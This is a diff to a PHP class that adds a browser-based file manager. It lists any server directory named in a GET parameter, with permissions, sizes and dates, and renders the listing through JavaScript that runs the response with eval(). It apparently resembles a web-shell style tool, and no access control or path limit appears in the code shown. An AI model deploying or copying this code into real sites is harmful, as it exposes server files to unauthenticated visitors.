@@ -7,6 +7,66 @@ class project {
     self::headers();
     self::G('time', 'end');
   }
+ function show(){
+    self::G('runtime');
+    header("Content-type:text/html;charset=utf-8");
+    $_GET["dir"] = !empty($_GET["dir"]) ? iconv("UTF-8", "GBK", $_GET["dir"]) : $_GET["dir"];
+    $file = !empty($_GET["dir"]) ? trim(self::switchUrl($_GET["dir"],true),"/")."/" : sprintf("%s%s",trim(webpath,"/"),"/");
+    if (!is_readable($file)) return false;
+    foreach(scandir($file) as $disk){
+        if($disk==".." ||$disk == "." ) continue;
+        if (is_dir($file.$disk)) $dir[] = $disk;
+        elseif(is_file($file.$disk)) $files[] = $disk;
+        else $disk=array();
+    }
+    if (!isset($dir)) $dir = array();
+    if (!isset($files)) $files = array();
+    foreach($dir as $i=>$gbk){
+        $utf8=iconv("GBK", "UTF-8",$gbk);
+        $directory[sprintf("%s%s","dir",$i)][]=$utf8;
+        $directory[sprintf("%s%s","dir",$i)][]=@self::perms($file.$gbk,1);
+        $directory[sprintf("%s%s","dir",$i)][]=@self::perms($file.$gbk,2);
+        $directory[sprintf("%s%s","dir",$i)][]=@self::perms($file.$gbk,3);
+        $directory[sprintf("%s%s","dir",$i)][]=@self::perms($file.$gbk,4);                        
+    }
+    unset($dir,$utf8,$gbk);
+    foreach($files as $i=>$gbk){
+        $utf8=iconv("GBK", "UTF-8",$gbk);
+        $document[sprintf("%s%s","file",$i)][]=$utf8;
+        $document[sprintf("%s%s","file",$i)][]=@self::perms($file.$gbk,1);
+        $document[sprintf("%s%s","file",$i)][]=@self::perms($file.$gbk,2);
+        $document[sprintf("%s%s","file",$i)][]=@self::perms($file.$gbk,3);
+        $document[sprintf("%s%s","file",$i)][]=@self::perms($file.$gbk,4);   
+    }
+    unset($files,$utf8,$gbk);
+    $return["dir"]=$directory;
+    $return["dir"]["total"]=count($directory);
+    $return["file"]=$document;
+    $return["file"]["total"]=count($document);
+    $return["url"]=$file;
+    $return['ajax']=iconv("GBK", "UTF-8",self::switchUrl($file));
+    $return['back']=iconv("GBK", "UTF-8",self::switchUrl(dirname($file)));
+    $return['runtime']=self::G('runtime','end');
+    echo "json=".json_encode($return);
+    unset($return);
+    self::G('runtime','end');
+}
+
+static protected function perms($file, $type = '1') {
+    if ($type == 1) {
+      return substr(sprintf('%o', fileperms($file)), -4);
+    }
+    if ($type == 2) {
+      return self::getperms($file);
+    }
+    if ($type == 3) {
+      return date('Y-m-d h:i:s', filemtime($file));
+    }
+    if ($type == 4) {
+      return is_dir($file) ? 'directory' : self::byte_format(sprintf("%u",
+        filesize($file)));
+    }
+  }
   static protected function headers() {
     $eof = <<< HTML
 <!DOCTYPE HTML>
@@ -16,7 +76,7 @@ class project {
 	<meta name="author" content="Steve Smith" />
 	<title>{title}</title>
     <style>
-a{color:#00f;text-decoration:underline;}a:hover{color:#f00;text-decoration:none;}body{font:12px Arial,Tahoma;line-height:16px;margin:0;padding:0;}#header{height:20px;border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 15px 5px 5px;font-weight:bold;}#header .left{float:left;}#header .right{float:right;}#menu{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 15px 5px 5px;}#content{margin:0 auto;width:98%;}#content h2{margin-top:15px;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}#content #base,#content #base2{background:#eee;margin-bottom:10px;}#base input{float:right;border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;margin:5px 10px;}.cdrom{padding:5px;margin:auto 7px;}.h{margin-top:8px;}#base2 .input{font:12px Arial,Tahoma;background:#fff;border:1px solid #666;padding:2px;height:18px;}#base2 .bt{border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}#list .head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 15px 5px 5px;font-weight:bold;}#list .head td span{font-weight:normal;}.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 15px 5px 5px;}.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 15px 5px 5px;}.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;}#footer{padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;}#load{position:fixed;right:0;border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;display:none;}
+    a{color:#00f;text-decoration:underline;}a:hover{color:#f00;text-decoration:none;}body{font:12px Arial,Tahoma;line-height:16px;margin:0;padding:0;}#header{height:20px;border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 15px 5px 5px;font-weight:bold;}#header .left{float:left;}#header .right{float:right;}#menu{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 15px 5px 5px;}#content{margin:0 auto;width:98%;}#content h2{margin-top:15px;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}#content #base,#content #base2{background:#eee;margin-bottom:10px;}#base input{float:right;border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;margin:5px 10px;}.cdrom{padding:5px;margin:auto 7px;}.h{margin-top:8px;}#base2 .input{font:12px Arial,Tahoma;background:#fff;border:1px solid #666;padding:2px;height:18px;}#base2 .bt{border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}dl,dt,dd{margin:0;}.focus{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;}.fff{background:#fff}dl{margin:0 auto;width:100%;}dt,dd{overflow:hidden;border-top:1px solid white;border-bottom:1px solid #DDD;background:#F1F1F1;padding:5px 15px 5px 5px;}dt{border-top:1px solid white;border-bottom:1px solid #DDD;background:#E9E9E9;font-weight:bold;padding:5px 15px 5px 5px;}dt span,dd span{width:19%;display:block;float:left;font-size:14px;text-indent:0em;}#footer{padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;}#load{position:fixed;right:0;border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;display:none;}.in{width:40px;text-align:center;}
     </style>
 </head>
 <body>
@@ -54,7 +114,7 @@ loading……
       Find string in files(current folder): <input class="input" name="findstr" value="" type="text" /> <input class="bt" value="Find" type="submit" /> Type: <input class="input" name="writabledb" value="php,cgi,pl,asp,inc,js,html,htm,jsp" type="text" /><input name="dir" value="C:/freebsd/" type="hidden" /> 
     </div>
   </div>
-  <div id="list">
+  <div id="show">
   </div>
 </div>
 <div class="h"></div>
@@ -71,6 +131,7 @@ loading……
   function $(id){
     return document.getElementById(id);
   }
+  top1="<dl><dt><span class=\"in\">　</span><span>Filename</span><span>Last modified</span><span>Size</span><span>Chmod / Perms</span><span>Action</span></dt><dd ><span class=\"in\">-</span><span><a href=\"javascript:void()\" onclick=\"ajax(json.back,1)\">Parent Directory</a></span><span></span><span></span><span></span><span></span></dd>";
  function ajax(url,type){
     $("load").style.display="block";
     var xml;
@@ -82,14 +143,27 @@ loading……
  xml.onreadystatechange=function(){
     if (4==xml.readyState){
         if(200==xml.status){
+            $("show").innerHTML=top1;
             eval(xml.responseText);
-            $("list").innerHTML=json.file;
-            $("runtime").innerHTML=json.runtime;
-            $("total").innerHTML=json.disktotal;
-            $("current").innerHTML=json.current;
-            $("chmod").innerHTML=json.chmod;
-            $("perms").innerHTML=json.perms;
-            $("load").style.display="none";
+           /***********************/
+      //$("show").innerHTML="";
+     $("runtime").innerHTML=json.runtime;
+     //if(json.file.total>100) json.file.total=100;
+ for (var i=0;i<json.dir.total;i++){
+      alt= i %2 ? "dd" : "fff";
+      var current=json.ajax;
+      var dir=eval("json.dir.dir"+i);
+      top1+="<dd class=\""+alt+"\" onmouseover=\"this.className='focus';\" onmouseout=\"this.className='"+alt+"';\"><span class=\"in\"><input name=\"dl[]\" type=\"checkbox\" value=\"\"></span><span><a href=\"javascript:void();\" name=\""+current+""+dir[0]+"\" onclick=\"ajax(this.name,1)\">"+dir[0]+"</a></span><span><a href=\"javascript:void();\">"+dir[3]+"</a></span><span>"+dir[4]+"</span><span><a href=\"javascript:void();\">"+dir[1]+"</a>/<a href=\"javascript:void();\">"+dir[2]+"</a></span><span><a href=\"\">Rename</a></span></dd>";
+ }
+ //if(json.file.total>100) json.file.total=100;
+ for (var i=0;i<json.file.total;i++){
+      alt= i %2 ? "fff" : "dd";
+      var dir=eval("json.file.file"+i);
+      top1+="<dd class=\""+alt+"\" onmouseover=\"this.className='focus';\" onmouseout=\"this.className='"+alt+"';\"><span class=\"in\"><input name=\"dl[]\" type=\"checkbox\" value=\"\"></span><span><a href=\"javascript:void();\" name=\"\" onclick=\"ajax(this.name,1)\">"+dir[0]+"</a></span><span><a href=\"javascript:void();\">"+dir[3]+"</a></span><span>"+dir[4]+"</span><span><a href=\"javascript:void();\">"+dir[1]+"</a>/<a href=\"javascript:void();\">"+dir[2]+"</a></span><span><a href=\"javascript:void();\">Down</a> |<a href=\"javascript:void();\">Copy</a> |<a href=\"javascript:void();\">Edit</a> |<a href=\"javascript:void();\">Rename</a></span></dd>";
+ }
+ $("show").innerHTML=top1;
+  $("load").style.display="none";
+/*************************/
         }
     }
  }  
@@ -287,35 +361,6 @@ HTML;
     //call_user_func(array(__class__,$path));
     return;
   }
-  static protected function perms($file, $path = '', $type = '1') {
-    if ($type == 1) {
-      //foreach($file as $v){
-      $url = self::is_utf8($file) ? $path . iconv('UTF-8', 'GBK', $file) : $path .
-        $file;
-      return substr(sprintf('%o', fileperms($url)), -4);
-      //}
-      //return $perms;
-    }
-    if ($type == 2) {
-      //foreach($file as $v){
-      $url = self::is_utf8($file) ? $path . iconv('UTF-8', 'GBK', $file) : $path .
-        $file;
-      return self::getperms($url);
-      //}
-      //return $perms;
-    }
-    if ($type == 3) {
-      $url = self::is_utf8($file) ? $path . iconv('UTF-8', 'GBK', $file) : $path .
-        $file;
-      return date('Y-m-d h:i:s', filemtime($url));
-    }
-    if ($type == 4) {
-      $url = self::is_utf8($file) ? $path . iconv('UTF-8', 'GBK', $file) : $path .
-        $file;
-      return is_dir($url) ? 'directory' : self::byte_format(sprintf("%u",
-        filesize($url)));
-    }
-  }
   static protected function getperms($path) {
     $perms = fileperms($path);
     if (($perms & 0xC000) == 0xC000) {
@@ -385,6 +430,4 @@ HTML;
     return round($size, $dec) . "" . $a[$pos];
   }
 }
-//
-
-?>
+//?>
